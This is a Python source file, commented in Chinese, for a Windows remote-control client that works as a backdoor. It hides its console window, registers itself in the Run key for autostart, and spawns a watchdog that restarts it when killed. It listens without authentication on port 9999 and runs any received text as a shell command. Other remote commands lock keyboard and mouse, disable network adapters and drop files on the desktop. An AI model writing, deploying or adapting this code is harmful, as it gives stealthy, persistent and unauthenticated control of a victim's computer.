import socket
import subprocess
import os
import sys
import ctypes
import time
import threading
import winreg
from datetime import datetime
import psutil
import tkinter as tk
from tkinter import messagebox
import queue
import traceback
import getpass  # 用于获取当前用户名

# 修复 ctypes.wintypes 缺失问题
if not hasattr(ctypes, 'wintypes'):
    class Wintypes:
        class HWND(ctypes.c_void_p):
            pass
        class UINT(ctypes.c_uint):
            pass
        class WPARAM(ctypes.c_ulong):
            pass
        class LPARAM(ctypes.c_long):
            pass
        class LRESULT(ctypes.c_long):
            pass
        UINT_PTR = WPARAM  # 修复 UINT_PTR 缺失问题
    ctypes.wintypes = Wintypes()
elif not hasattr(ctypes.wintypes, 'UINT_PTR'):
    ctypes.wintypes.UINT_PTR = ctypes.wintypes.WPARAM

# 配置参数
SERVER_IP = '0.0.0.0'
SERVER_PORT = 9999
LOG_FILE = "client_log.txt"
SELF_RESTART_DELAY = 5  # 自动重启延迟（秒）
MONITOR_INTERVAL = 2  # 进程监控间隔（秒）
NORMAL_EXIT_FILE = "normal_exit.tmp"   # 正常退出标记文件
MESSAGE_SEPARATOR = "|||__SEP__|||"

class ClientServer:
    def __init__(self):
        self.running = True
        self.normal_exit = False
        self.lock = threading.Lock()
        self.input_locked = False
        self.internet_disabled = False
        self.server_socket = None
        self.client_socket = None
        
        # 获取桌面路径
        self.desktop_path = self.get_desktop_path()
        self.log(f"文件将保存到桌面: {self.desktop_path}")
        
        # 弹窗相关设置
        self.msg_queue = queue.Queue()
        self.ui_thread = threading.Thread(target=self.create_ui, daemon=True)
        self.ui_thread.start()
        time.sleep(1)  # 等待UI初始化
        
        self.log("被控端程序启动")
        self.hide_window()
        self.set_autostart()
        self.start_monitor_process()
        self.start_server()
        self.main_loop()
    
    def get_desktop_path(self):
        """获取当前用户的桌面路径"""
        try:
            # 方法1: 使用环境变量
            if os.name == 'nt':  # Windows系统
                return os.path.join(os.environ['USERPROFILE'], 'Desktop')
            else:  # 其他系统
                return os.path.join(os.path.expanduser('~'), 'Desktop')
        except:
            try:
                # 方法2: 使用用户名获取
                username = getpass.getuser()
                return f"C:\\Users\\{username}\\Desktop"
            except:
                # 方法3: 最后的 fallback
                return os.path.join(os.getcwd(), "Desktop")
    
    def create_ui(self):
        """创建独立的UI线程"""
        self.root = tk.Tk()
        self.root.withdraw()  # 隐藏主窗口
        threading.current_thread().name = "UI-Thread"
        self.check_msg_queue()
        self.root.mainloop()
    
    def check_msg_queue(self):
        """检查消息队列并显示弹窗"""
        try:
            while not self.msg_queue.empty():
                msg = self.msg_queue.get()
                if not isinstance(msg, str):
                    msg = str(msg)
                if not msg.strip():
                    msg = "收到空消息"
                    self.log("弹窗内容为空，显示默认提示")
                
                top = tk.Toplevel(self.root)
                top.title("远程消息")
                top.attributes("-topmost", True)
                top.geometry("400x200+{}+{}".format(
                    int(self.root.winfo_screenwidth()/2 - 200),
                    int(self.root.winfo_screenheight()/2 - 100)
                ))
                
                msg_label = tk.Label(top, text=msg, wraplength=380, padx=10, pady=10)
                msg_label.pack(expand=True, fill=tk.BOTH)
                
                ok_btn = tk.Button(top, text="确定", command=top.destroy)
                ok_btn.pack(pady=10)
                
                top.update_idletasks()
                top.update()
                
                self.log(f"弹窗显示成功，内容长度: {len(msg)} 字符")
                
            self.root.after(50, self.check_msg_queue)
        except Exception as e:
            self.log(f"弹窗处理错误: {str(e)}\n{traceback.format_exc()}")
            self.root.after(50, self.check_msg_queue)
    
    def hide_window(self):
        """隐藏控制台窗口"""
        try:
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            if hwnd != 0:
                ctypes.windll.user32.ShowWindow(hwnd, 0)
        except Exception as e:
            self.log(f"隐藏窗口失败: {str(e)}")
    
    def set_autostart(self):
        """设置开机自启动"""
        try:
            if getattr(sys, 'frozen', False):
                script_path = sys.executable
            else:
                script_path = os.path.abspath(sys.argv[0])
            
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(key, "RemoteControlClient", 0, winreg.REG_SZ, script_path)
            winreg.CloseKey(key)
            self.log("开机自启动设置成功")
        except Exception as e:
            self.log(f"开机自启动设置失败: {str(e)}")
    
    def log(self, message):
        """记录日志"""
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_entry = f"[{timestamp}] {message}\n"
            
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(log_entry)
        except Exception as e:
            print(f"日志记录失败: {str(e)}")
    
    def start_monitor_process(self):
        """启动独立监控进程"""
        current_pid = os.getpid()
        self.log(f"主进程ID: {current_pid}，启动监控进程")
        
        monitor_script = f"""
import psutil
import time
import subprocess
import sys
import os

TARGET_PID = {current_pid}
SELF_RESTART_DELAY = {SELF_RESTART_DELAY}
APP_PATH = "{os.path.abspath(sys.argv[0])}"
NORMAL_EXIT_FILE = "{NORMAL_EXIT_FILE}"

def monitor_and_restart():
    while True:
        try:
            psutil.Process(TARGET_PID)
            time.sleep({MONITOR_INTERVAL})
        except psutil.NoSuchProcess:
            if os.path.exists(NORMAL_EXIT_FILE):
                os.remove(NORMAL_EXIT_FILE)
                print("检测到正常退出，监控进程终止")
                break
            print(f"进程{{TARGET_PID}}异常终止，{{SELF_RESTART_DELAY}}秒后重启...")
            time.sleep(SELF_RESTART_DELAY)
            try:
                if sys.argv[0].endswith('.exe'):
                    subprocess.Popen([APP_PATH], close_fds=True)
                else:
                    subprocess.Popen([sys.executable, APP_PATH], close_fds=True)
                print(f"应用已重启: {{APP_PATH}}")
                break
            except Exception as e:
                print(f"重启失败: {{e}}")
                time.sleep(10)

if __name__ == "__main__":
    monitor_and_restart()
        """
        
        monitor_script_path = os.path.join(os.path.dirname(sys.argv[0]), "process_monitor_temp.py")
        with open(monitor_script_path, "w", encoding="utf-8") as f:
            f.write(monitor_script)
        
        try:
            subprocess.Popen(
                [sys.executable, monitor_script_path],
                close_fds=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            self.log("监控进程已启动")
        except Exception as e:
            self.log(f"启动监控进程失败: {str(e)}")
    
    def stop(self):
        """正常退出"""
        self.normal_exit = True
        self.running = False
        with open(NORMAL_EXIT_FILE, "w") as f:
            f.write("1")
        if self.client_socket:
            self.client_socket.close()
        if self.server_socket:
            self.server_socket.close()
        for file in ["process_monitor_temp.py"]:
            if os.path.exists(file):
                os.remove(file)
        self.log("程序正常退出")
        sys.exit(0)
    
    def start_server(self):
        """启动服务器监听连接"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.bind((SERVER_IP, SERVER_PORT))
            self.server_socket.listen(5)
            self.server_socket.settimeout(1)
            self.log(f"服务器启动，监听 {SERVER_IP}:{SERVER_PORT}")
        except Exception as e:
            self.log(f"服务器启动失败: {str(e)}")
            self.stop()
    
    def handle_client(self, client_socket):
        """处理客户端命令"""
        self.client_socket = client_socket
        try:
            while self.running:
                data = client_socket.recv(4096).decode('utf-8')
                if not data:
                    break
                self.log(f"收到命令: {data} (长度: {len(data)})")
                
                # 弹窗命令处理
                if data.startswith("__POPUP_MESSAGE__" + MESSAGE_SEPARATOR):
                    try:
                        separator_pos = data.find(MESSAGE_SEPARATOR)
                        if separator_pos == -1:
                            client_socket.sendall("弹窗消息格式错误: 未找到分隔符".encode('utf-8'))
                            continue
                            
                        msg = data[separator_pos + len(MESSAGE_SEPARATOR):]
                        
                        if not msg.strip():
                            msg = "收到空消息内容"
                            self.log("检测到空消息内容，使用默认文本")
                        
                        self.msg_queue.put(msg)
                        client_socket.sendall(f"弹窗消息已发送，内容长度: {len(msg)} 字符".encode('utf-8'))
                        
                    except Exception as e:
                        error_msg = f"处理弹窗消息失败: {str(e)}"
                        self.log(error_msg)
                        client_socket.sendall(error_msg.encode('utf-8'))
                
                elif data == "__EXIT__":
                    client_socket.sendall("收到退出命令，程序即将关闭".encode('utf-8'))
                    self.stop()
                
                elif data == "__LOCK_INPUT__":
                    res = self.lock_input_devices()
                    client_socket.sendall(res.encode('utf-8'))
                elif data == "__UNLOCK_INPUT__":
                    res = self.unlock_input_devices()
                    client_socket.sendall(res.encode('utf-8'))
                elif data == "__disable_INTERNET__":
                    res = self.disable_internet()
                    client_socket.sendall(res.encode('utf-8'))
                elif data == "__enable_INTERNET__":
                    res = self.enable_internet()
                    client_socket.sendall(res.encode('utf-8'))
                elif data.startswith("__SEND_FILE__"):
                    _, file_name, file_size = data.split("|")
                    res = self.receive_file(client_socket, file_name, int(file_size))
                    client_socket.sendall(res.encode('utf-8'))
                else:
                    res = self.execute_command(data)
                    client_socket.sendall(res.encode('utf-8'))
        except Exception as e:
            self.log(f"客户端处理错误: {str(e)}")
        finally:
            client_socket.close()
    
    def execute_command(self, cmd):
        try:
            result = subprocess.run(
                cmd,
                shell=True,
                check=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                timeout=30
            )
            return f"命令执行成功:\n{result.stdout}"
        except subprocess.CalledProcessError as e:
            return f"命令执行失败:\n{e.stderr}"
        except subprocess.TimeoutExpired:
            return f"命令执行超时（30秒）"
        except Exception as e:
            return f"执行命令时发生错误: {str(e)}"
    
    def lock_input_devices(self):
        if self.input_locked:
            return "输入设备已处于锁定状态"
        
        try:
            self.block_input(True)
            self.input_locked = True
            return "输入设备已锁定"
        except Exception as e:
            return f"锁定输入设备失败: {str(e)}"
    
    def unlock_input_devices(self):
        if not self.input_locked:
            return "输入设备已处于解锁状态"
        
        try:
            self.block_input(False)
            self.input_locked = False
            return "输入设备已解锁"
        except Exception as e:
            return f"解锁输入设备失败: {str(e)}"
    
    def block_input(self, block):
        user32 = ctypes.WinDLL('user32', use_last_error=True)
        return user32.BlockInput(block)
    
    def disable_internet(self):
        if self.internet_disabled:
            return "网络已处于禁用状态"
        
        try:
            adapters = self.get_network_adapters()
            results = []
            
            for adapter in adapters:
                try:
                    subprocess.run(
                        ["netsh", "interface", "set", "interface", f'"{adapter}"', "admin=disable"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    results.append(f"已禁用: {adapter}")
                except Exception as e:
                    results.append(f"禁用 {adapter} 失败: {str(e)}")
            
            self.internet_disabled = True
            return "\n".join(results)
        except Exception as e:
            return f"禁用网络失败: {str(e)}"
    
    def enable_internet(self):
        if not self.internet_disabled:
            return "网络已处于启用状态"
        
        try:
            adapters = self.get_network_adapters()
            results = []
            
            for adapter in adapters:
                try:
                    subprocess.run(
                        ["netsh", "interface", "set", "interface", f'"{adapter}"', "admin=enable"],
                        check=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    results.append(f"已启用: {adapter}")
                except Exception as e:
                    results.append(f"启用 {adapter} 失败: {str(e)}")
            
            self.internet_disabled = False
            return "\n".join(results)
        except Exception as e:
            return f"启用网络失败: {str(e)}"
    
    def get_network_adapters(self):
        try:
            result = subprocess.run(
                ["netsh", "interface", "show", "interface"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            adapters = []
            lines = result.stdout.splitlines()
            
            for line in lines[3:]:
                parts = line.strip().split(maxsplit=3)
                if len(parts) >= 4:
                    adapters.append(parts[3])
            
            return adapters if adapters else ["Ethernet", "Wi-Fi"]
        except Exception as e:
            self.log(f"获取网络适配器失败: {str(e)}")
            return ["Ethernet", "Wi-Fi"]
    
    def receive_file(self, client_socket, file_name, file_size):
        """接收文件并保存到桌面"""
        try:
            # 确保桌面目录存在
            if not os.path.exists(self.desktop_path):
                os.makedirs(self.desktop_path)
            
            # 构建完整的保存路径（桌面 + 文件名）
            save_path = os.path.join(self.desktop_path, file_name)
            
            # 处理同名文件
            counter = 1
            original_name, extension = os.path.splitext(file_name)
            while os.path.exists(save_path):
                # 如果文件已存在，添加序号
                save_path = os.path.join(self.desktop_path, f"{original_name}_{counter}{extension}")
                counter += 1
            
            with open(save_path, 'wb') as f:
                received = 0
                while received < file_size:
                    chunk_size = min(1024, file_size - received)
                    data = client_socket.recv(chunk_size)
                    if not data:
                        break
                    f.write(data)
                    received += len(data)
            
            if received == file_size:
                return f"文件 {file_name} 接收成功，已保存到桌面: {save_path}"
            else:
                # 清理不完整文件
                if os.path.exists(save_path):
                    os.remove(save_path)
                return f"文件 {file_name} 接收不完整，预期 {file_size} 字节，实际接收 {received} 字节"
        except Exception as e:
            return f"接收文件失败: {str(e)}"
    
    def main_loop(self):
        while self.running:
            try:
                try:
                    client_socket, addr = self.server_socket.accept()
                    self.log(f"新连接: {addr}")
                    client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
                    client_thread.daemon = True
                    client_thread.start()
                except socket.timeout:
                    continue
                except Exception as e:
                    self.log(f"接受连接失败: {str(e)}")
                    time.sleep(1)
                
                time.sleep(0.1)
            except Exception as e:
                self.log(f"主循环错误: {str(e)}")
                time.sleep(1)

if __name__ == "__main__":
    try:
        client = ClientServer()
    except Exception as e:
        print(f"程序启动失败: {str(e)}")
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] 程序启动失败: {str(e)}\n")
